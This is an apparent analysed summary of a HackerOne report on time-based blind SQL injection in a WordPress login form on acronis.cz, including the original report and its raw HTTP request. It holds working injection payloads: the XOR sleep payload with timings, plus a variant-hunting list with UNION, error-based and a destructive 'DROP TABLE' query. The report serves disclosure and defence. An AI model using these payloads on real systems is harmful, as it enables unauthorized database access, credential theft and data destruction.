# SQL Injection Bypass in WordPress Login Form via XOR Time-Based Blind SQLi

## Metadata
- **Source:** HackerOne
- **Report:** 1224660 | https://hackerone.com/reports/1224660
- **Submitted:** 2021-06-12
- **Reporter:** lu3ky-13
- **Program:** Acronis
- **Bounty:** Not specified
- **Severity:** Critical
- **Vuln:** SQL Injection, Time-Based Blind SQL Injection, Authentication Bypass
- **CVEs:** None
- **Category:** uncategorised

## Summary
A time-based blind SQL injection vulnerability was discovered in the WordPress login form (/wp-login.php) on acronis.cz, allowing attackers to bypass authentication and extract database information through sleep-based timing attacks. The vulnerability uses XOR logic to evade basic SQL injection filters, as demonstrated by the payload 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z which caused measurable response time delays correlating to injected sleep commands.

## Attack scenario
1. Attacker identifies the WordPress login form accepts unsanitized input in the 'log' (username) parameter
2. Attacker crafts a time-based blind SQL injection payload using XOR operators to bypass input validation: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
3. Attacker submits the payload via POST request to /wp-login.php and measures response time (approximately 12 seconds for 10-second sleep)
4. By varying sleep duration and measuring response times, attacker confirms SQL execution and begins mapping database schema
5. Attacker leverages the vulnerability to extract sensitive data (usernames, password hashes, email addresses) from wp_users table
6. Attacker uses extracted credentials for account takeover or further privilege escalation within the application

## Root cause
Insufficient input validation and sanitization on the login form's 'log' parameter. The application likely uses parameterized queries incorrectly or concatenates user input directly into SQL statements without proper escaping. The XOR operator ('^') was not filtered, allowing it to be used as an obfuscation technique to bypass pattern-based WAF/IDS rules.

## Attacker mindset
An attacker with intermediate SQL and web application knowledge seeking to gain unauthorized access to a corporate system. The systematic testing of multiple sleep durations (0, 3, 6, 10, 15 seconds) demonstrates methodical reconnaissance to confirm the vulnerability's reliability and precision before escalating the attack.

## Defensive takeaways
- Implement parameterized queries/prepared statements exclusively for all database operations
- Apply strict input validation using whitelisting for the login form (alphanumeric only, length limits)
- Deploy Web Application Firewall (WAF) with signatures for time-based SQLi patterns and XOR-based obfuscation
- Implement rate limiting and account lockout mechanisms after failed login attempts to mitigate brute force via SQLi
- Use stored procedures with input validation rather than dynamic SQL construction
- Employ database-level access controls and least-privilege principles for application database user
- Enable SQL query logging and monitoring for detection of unusual timing patterns or IF/SLEEP/BENCHMARK functions
- Keep WordPress core, plugins, and all dependencies updated to patch known vulnerabilities
- Consider implementing CAPTCHA or MFA even before login validation to add friction to automated attacks
- Conduct regular security code reviews and penetration testing focusing on authentication mechanisms

## Variant hunting
Test XOR-based payloads in other input fields: pwd, email, search parameters, comment forms
Attempt union-based SQLi variants: 0' UNION SELECT NULL,NULL,NULL--
Test boolean-based blind SQLi: 0' AND (SELECT COUNT(*) FROM wp_users)>0--
Probe for error-based SQLi by injecting: 0' AND extractvalue(1,concat(0x7e,(SELECT user())))--
Test stacked queries if supported: 0'; DROP TABLE wp_users;--
Check if the vulnerability exists in registration, password reset, and comment forms
Attempt to bypass with alternative encoding: %u0027, 0x27, char(39)
Test if other logical operators work: OR, AND after XOR filtering is bypassed
Investigate if the vulnerability affects API endpoints or AJAX handlers
Check for second-order SQLi where injected data is stored and executed later

## MITRE ATT&CK
- T1190
- T1566
- T1110
- T1021
- T1078
- T1505.004

## Notes
The writeup demonstrates practical time-based blind SQLi exploitation with concrete timing measurements. The attacker provided HTTP request details and proof of concept, making reproduction straightforward. The use of XOR as an obfuscation technique suggests prior attempts to filter SQL injection payloads failed. The vulnerability is on a high-value corporate domain (Acronis - a backup/disaster recovery vendor), indicating potential for significant impact including access to sensitive customer data. The presence of WordPress and reCAPTCHA suggests the site may have attempted basic security controls that were insufficient. The discovery of case #1109311 reference suggests this may be a duplicate or related to a previously known but unfixed issue.

## Full report
<details><summary>Expand</summary>

hello dear support

i have found SQL injection and bypass this case #1109311

Tests performed:

    0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 20.002
    0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 7.282
    0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.912
    0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 16.553
    0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.463
    0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 1.229
    0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 7.79
Proof
=======

{F1335267}

payload in photos
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z

http request
=============

POST /wp-login.php HTTP/2
Host: www.acronis.cz
Cookie: PHPSESSID=49kn3h0ecv1urjd70jucn2j4gh; _fbp=fb.1.1623467463578.959472854; wordpress_test_cookie=WP+Cookie+check
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.acronis.cz/wp-login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 717
Origin: https://www.acronis.cz
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

log=0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&pwd=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%2815%29%2C0%29%29XOR%27Z+%3D%3E&g-recaptcha-response=03AGdBq25b-W6tugq-xMA5r4HA1FJJX1uDMve_1fZXKK0wtp2SxW745D7MwrwsXYpIQtRFHR4cMPxIWp5nTWRR89A4LGaom7kVvG7eMiPGe2z-rQIAM9oAd2Anp5_RBkg9tTndCyHlFh1cMUZKTtq-eF1yEI_Ixi7c6-xkDrqvs0Kb5DEZ_eu9SWNnm_evtbW0XXtz8pI7ipHNzw5icYUn6LmxkbxmyqfyQ5j4ZaPGnoPvtS2huSZKyN9RoVBL-v9UHs8Zdkj1dcVvVwurhVCNjBBFPTnZeA-D1iYSp_kqtfLzW1d84F_-9p09Tw9bp7qlirNa-UFSKnWxY27c6oAw5_p649TgBzLQMY4-bMK0_2bbqOv1RIy2vhqIXjpeh6r8l4-MAHHgllF0iW2ClpXKn5Y95DSg2muoc-zzdQ5xE2cpLL3Gw71nNITafbIC2QEKyyS-QBk8h1dn&wp-submit=P%C5%99ihl%C3%A1sit+se&redirect_to=https%3A%2F%2Fwww.acronis.cz%2Fwp-admin%2F&testcookie=1

sleep 10 it's response millis 12000 

Vulnerability Description


SQL injection (SQLi) refers to an injection attack wherein an attacker can execute malicious SQL statements that control a web application's database server.

## Impact

An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.

</details>

---
*Analysed by Claude on 2026-05-11*
